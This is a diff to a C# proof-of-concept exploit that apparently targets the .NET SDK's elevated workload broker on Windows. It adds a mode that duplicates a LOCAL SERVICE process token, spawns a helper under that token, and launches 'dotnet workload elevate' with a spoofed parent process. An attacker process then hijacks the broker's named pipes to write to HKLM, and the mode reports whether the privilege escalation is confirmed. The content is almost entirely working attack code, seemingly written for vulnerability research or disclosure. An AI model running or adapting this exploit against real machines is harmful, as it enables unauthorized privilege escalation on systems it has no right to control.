@@ -62,7 +62,8 @@ internal static class Program
             return RunAttackerSync(
                 serverPid: int.Parse(args[1]),
                 expectedParentPid: int.Parse(args[2]),
-                sdkMajor: int.Parse(args[3]));
+                sdkMajor: int.Parse(args[3]),
+                requireMediumIntegrity: false);
         }
 
         if (args.Length > 0 && args[0] == "ots-cross-user")
@@ -71,6 +72,11 @@ internal static class Program
                 standardUserName: args[1],
                 standardUserPassword: args[2],
                 sdkMajor: int.Parse(args[3]));
+        }
+
+        if (args.Length > 0 && args[0] == "ots-cross-sid-service")
+        {
+            return await RunCrossSidServiceAsync(sdkMajor: int.Parse(args[1]));
         }
 
         return await RunParentAsync();
@@ -363,6 +369,158 @@ internal static class Program
     }
 
 
+    private static async Task<int> RunCrossSidServiceAsync(int sdkMajor)
+    {
+        const string LowPrivilegeSid = "S-1-5-19"; // NT AUTHORITY\\LOCAL SERVICE
+
+        string dotnet = Environment.ProcessPath ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
+        string dll = Assembly.GetExecutingAssembly().Location;
+        string workingDirectory = Path.GetDirectoryName(dll) ?? Environment.CurrentDirectory;
+        string evidencePath = Path.Combine(workingDirectory, $"cross-sid-evidence-{Guid.NewGuid():N}.txt");
+
+        using WindowsIdentity serverIdentity = WindowsIdentity.GetCurrent();
+        string serverSid = serverIdentity.User?.Value ?? throw new InvalidOperationException("Server SID unavailable.");
+        bool serverAdmin = new WindowsPrincipal(serverIdentity).IsInRole(WindowsBuiltInRole.Administrator);
+        Console.WriteLine($"CROSS_SID_SERVER_ACCOUNT={serverIdentity.Name}");
+        Console.WriteLine($"CROSS_SID_SERVER_SID={serverSid}");
+        Console.WriteLine($"CROSS_SID_SERVER_IS_ADMIN={serverAdmin}");
+
+        IntPtr lowPrivilegeToken = DuplicatePrimaryTokenForSid(LowPrivilegeSid);
+        PROCESS_INFORMATION helperPi = default;
+        PROCESS_INFORMATION serverPi = default;
+        PROCESS_INFORMATION attackerPi = default;
+        IntPtr parentHandle = IntPtr.Zero;
+
+        try
+        {
+            using var lowIdentity = new WindowsIdentity(lowPrivilegeToken);
+            string lowSid = lowIdentity.User?.Value ?? throw new InvalidOperationException("Low privilege SID unavailable.");
+            Console.WriteLine($"CROSS_SID_LOW_ACCOUNT={lowIdentity.Name}");
+            Console.WriteLine($"CROSS_SID_LOW_SID={lowSid}");
+            Console.WriteLine($"CROSS_SID_DIFFERENT_IDENTITY={lowSid != serverSid}");
+
+            helperPi = StartProcessWithToken(lowPrivilegeToken, dotnet, $"\"{dll}\" ots-helper", workingDirectory, loadProfile: false);
+            int helperPid = checked((int)helperPi.dwProcessId);
+            Console.WriteLine($"CROSS_SID_PARENT_PID={helperPid}");
+
+            parentHandle = OpenProcess(OtsProcessCreateProcess | OtsProcessQueryLimitedInformation, false, helperPi.dwProcessId);
+            if (parentHandle == IntPtr.Zero)
+            {
+                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess low-SID parent failed");
+            }
+
+            serverPi = StartProcessWithExplicitParent(
+                parentHandle,
+                dotnet,
+                $"\"{dotnet}\" workload elevate --client-temp \"{Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar)}\"",
+                workingDirectory);
+
+            int serverPid = checked((int)serverPi.dwProcessId);
+            Console.WriteLine($"CROSS_SID_ELEVATED_SERVER_PID={serverPid}");
+            await Task.Delay(150);
+
+            attackerPi = StartProcessWithToken(
+                lowPrivilegeToken,
+                dotnet,
+                $"\"{dll}\" ots-attacker {serverPid} {helperPid} {sdkMajor} \"{evidencePath}\"",
+                workingDirectory,
+                loadProfile: false);
+
+            int attackerPid = checked((int)attackerPi.dwProcessId);
+            Console.WriteLine($"CROSS_SID_ATTACKER_PID={attackerPid}");
+
+            using Process attacker = Process.GetProcessById(attackerPid);
+            Task exited = attacker.WaitForExitAsync();
+            if (await Task.WhenAny(exited, Task.Delay(TimeSpan.FromSeconds(20))) != exited)
+            {
+                Console.WriteLine("CROSS_SID_ATTACKER_TIMEOUT=True");
+                try { attacker.Kill(entireProcessTree: true); } catch { }
+                return 124;
+            }
+
+            string evidence = File.Exists(evidencePath) ? await File.ReadAllTextAsync(evidencePath) : string.Empty;
+            Console.WriteLine("=== CROSS-SID ATTACKER EVIDENCE ===");
+            Console.Write(evidence);
+            Console.WriteLine($"CROSS_SID_ATTACKER_EXIT={attacker.ExitCode}");
+
+            bool confirmed =
+                serverAdmin &&
+                lowSid == LowPrivilegeSid &&
+                lowSid != serverSid &&
+                evidence.Contains($"OTS_ATTACKER_SID={lowSid}", StringComparison.Ordinal) &&
+                evidence.Contains("ATTACKER_DIRECT_HKLM_WRITE_ALLOWED=False", StringComparison.Ordinal) &&
+                evidence.Contains("DISPATCH_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
+                evidence.Contains("LOG_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
+                evidence.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
+                evidence.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
+                evidence.Contains("ELEVATED_BROKER_PRIVILEGE_BYPASS=CONFIRMED", StringComparison.Ordinal);
+
+            Console.WriteLine($"SDK_WORKLOAD_PIPE_CROSS_SID_EOP={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
+            return confirmed ? 0 : 1;
+        }
+        finally
+        {
+            try { if (File.Exists(evidencePath)) File.Delete(evidencePath); } catch { }
+            if (attackerPi.hThread != IntPtr.Zero) CloseHandle(attackerPi.hThread);
+            if (attackerPi.hProcess != IntPtr.Zero) CloseHandle(attackerPi.hProcess);
+            if (serverPi.hProcess != IntPtr.Zero) OtsTerminateProcess(serverPi.hProcess, 0);
+            if (serverPi.hThread != IntPtr.Zero) CloseHandle(serverPi.hThread);
+            if (serverPi.hProcess != IntPtr.Zero) CloseHandle(serverPi.hProcess);
+            if (helperPi.hProcess != IntPtr.Zero) OtsTerminateProcess(helperPi.hProcess, 0);
+            if (helperPi.hThread != IntPtr.Zero) CloseHandle(helperPi.hThread);
+            if (helperPi.hProcess != IntPtr.Zero) CloseHandle(helperPi.hProcess);
+            if (parentHandle != IntPtr.Zero) CloseHandle(parentHandle);
+            if (lowPrivilegeToken != IntPtr.Zero) CloseHandle(lowPrivilegeToken);
+        }
+    }
+
+    private static IntPtr DuplicatePrimaryTokenForSid(string targetSid)
+    {
+        const uint TokenQuery = 0x0008;
+        const uint TokenDuplicate = 0x0002;
+        const uint MaximumAllowed = 0x02000000;
+
+        foreach (Process process in Process.GetProcesses())
+        {
+            IntPtr processHandle = IntPtr.Zero;
+            IntPtr token = IntPtr.Zero;
+            try
+            {
+                processHandle = OpenProcess(OtsProcessQueryLimitedInformation, false, checked((uint)process.Id));
+                if (processHandle == IntPtr.Zero) continue;
+                if (!OpenProcessToken(processHandle, TokenQuery | TokenDuplicate, out token)) continue;
+
+                using var identity = new WindowsIdentity(token);
+                if (!string.Equals(identity.User?.Value, targetSid, StringComparison.Ordinal)) continue;
+
+                if (!DuplicateTokenEx(
+                    token,
+                    MaximumAllowed,
+                    IntPtr.Zero,
+                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                    TOKEN_TYPE.TokenPrimary,
+                    out IntPtr primaryToken))
+                {
+                    continue;
+                }
+
+                Console.WriteLine($"CROSS_SID_TOKEN_SOURCE_PID={process.Id}");
+                Console.WriteLine($"CROSS_SID_TOKEN_SOURCE_NAME={process.ProcessName}");
+                return primaryToken;
+            }
+            catch
+            {
+            }
+            finally
+            {
+                if (token != IntPtr.Zero) CloseHandle(token);
+                if (processHandle != IntPtr.Zero) CloseHandle(processHandle);
+                process.Dispose();
+            }
+        }
+
+        throw new InvalidOperationException($"Unable to duplicate a primary token for SID {targetSid}.");
+    }
     private static async Task<int> RunCrossUserOtsAsync(string standardUserName, string standardUserPassword, int sdkMajor)
     {
         string dotnet = Environment.ProcessPath ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
@@ -447,7 +605,7 @@ internal static class Program
                 evidence.Contains("LOG_PIPE_CONNECTED_BY_NON_PARENT=True", StringComparison.Ordinal) &&
                 evidence.Contains("HKLM_MARKER_CREATED=True", StringComparison.Ordinal) &&
                 evidence.Contains("HKLM_MARKER_CLEANED=True", StringComparison.Ordinal) &&
-                evidence.Contains("ELEVATED_BROKER_MEDIUM_IL_BYPASS=CONFIRMED", StringComparison.Ordinal);
+                evidence.Contains("ELEVATED_BROKER_PRIVILEGE_BYPASS=CONFIRMED", StringComparison.Ordinal);
 
             Console.WriteLine($"SDK_WORKLOAD_PIPE_CROSS_USER_OTS_EOP={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
             return confirmed ? 0 : 1;
@@ -468,11 +626,12 @@ internal static class Program
         }
     }
 
-    private static PROCESS_INFORMATION StartProcessWithToken(IntPtr token, string application, string arguments, string workingDirectory)
+    private static PROCESS_INFORMATION StartProcessWithToken(IntPtr token, string application, string arguments, string workingDirectory, bool loadProfile = true)
     {
         var commandLine = new StringBuilder($"\"{application}\" {arguments}");
         STARTUPINFO si = new() { cb = Marshal.SizeOf<STARTUPINFO>() };
-        if (!CreateProcessWithTokenW(token, OtsLogonWithProfile, application, commandLine, OtsCreateNoWindow, IntPtr.Zero, workingDirectory, ref si, out PROCESS_INFORMATION pi))
+        uint logonFlags = loadProfile ? OtsLogonWithProfile : 0;
+        if (!CreateProcessWithTokenW(token, logonFlags, application, commandLine, OtsCreateNoWindow, IntPtr.Zero, workingDirectory, ref si, out PROCESS_INFORMATION pi))
         {
             throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "CreateProcessWithTokenW cross-user failed");
         }
@@ -543,7 +702,7 @@ internal static class Program
         }
     }
 
-    private static int RunAttackerSync(int serverPid, int expectedParentPid, int sdkMajor)
+    private static int RunAttackerSync(int serverPid, int expectedParentPid, int sdkMajor, bool requireMediumIntegrity = true)
     {
         Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
         Console.WriteLine($"ATTACKER_PID={Environment.ProcessId}");
@@ -637,13 +796,18 @@ internal static class Program
         try { log.Dispose(); } catch { }
         try { logDrain.Wait(TimeSpan.FromSeconds(2)); } catch { }
 
-        bool confirmed =
+        string effectiveIntegritySid = GetEffectiveIntegritySid();
+        bool privilegeBoundaryConfirmed =
             Environment.ProcessId != expectedParentPid &&
-            GetEffectiveIntegritySid() == "S-1-16-8192" &&
             !directWriteAllowed &&
             created &&
             cleaned;
 
+        bool confirmed =
+            privilegeBoundaryConfirmed &&
+            (!requireMediumIntegrity || effectiveIntegritySid == "S-1-16-8192");
+
+        Console.WriteLine($"ELEVATED_BROKER_PRIVILEGE_BYPASS={(privilegeBoundaryConfirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
         Console.WriteLine($"ELEVATED_BROKER_MEDIUM_IL_BYPASS={(confirmed ? "CONFIRMED" : "NOT_CONFIRMED")}");
         return confirmed ? 0 : 1;
     }
